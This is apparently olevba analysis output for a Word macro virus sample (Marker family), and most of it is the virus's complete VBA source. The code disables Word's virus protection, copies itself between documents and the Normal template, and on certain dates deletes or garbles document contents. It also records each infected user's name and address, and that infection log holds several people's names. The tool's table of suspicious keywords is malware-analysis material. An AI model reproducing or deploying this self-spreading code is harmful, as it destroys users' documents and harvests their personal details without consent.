olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-49ea9bc8fe7a2184a62edbd2072312c7251d73fe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-49ea9bc8fe7a2184a62edbd2072312c7251d73fe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    
    On Error Resume Next
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim AD, NT As Object
    
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For I = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next I

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
            NT.CodeModule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)

            AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
            AD.CodeModule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub

Private Sub Document_Open()
    
    On Error Resume Next
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim AD, NT As Object
    
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For I = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next I

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
            NT.CodeModule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)

            AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
            AD.CodeModule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub


' 12:57:18 AM - Friday, 4 Jun 1999
' NITIN  KURLE
'



' 06:26:34 AM - Sunday, 6 Jun 1999
' nitin kurle
'



' 04:55:46 PM - Tuesday, 15 Jun 1999
' MR. NITIN  KURLE
'



' 01:31:19 AM - Friday, 25 Jun 1999
' MR. NITIN  KURLE
'



' 09:57:17 PM - Thursday, 29 Jul 1999
' MR. NITIN  KURLE
'



' 05:59:46 PM - Friday, 20 Aug 1999
' Mr.Kurle
'



' 12:03:33 PM - Tuesday, 5 Oct 1999
' wefrew
'



' 06:45:18 PM - Wednesday, 20 Oct 1999
' canwst
'



' 10:55:26 AM - Tuesday, 16 Nov 1999
' alfa
'



' 09:56:48 AM - Wednesday, 15 Dec 1999
' C S SIKKA
'



' 04:14:38 PM - Tuesday, 4 Jan 2000
' C S SIKKA
'



' 04:47:08 PM - Thursday, 13 Apr 2000
' asha
'



' 05:52:39  - Monday, 8 May 2000
' Uma
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

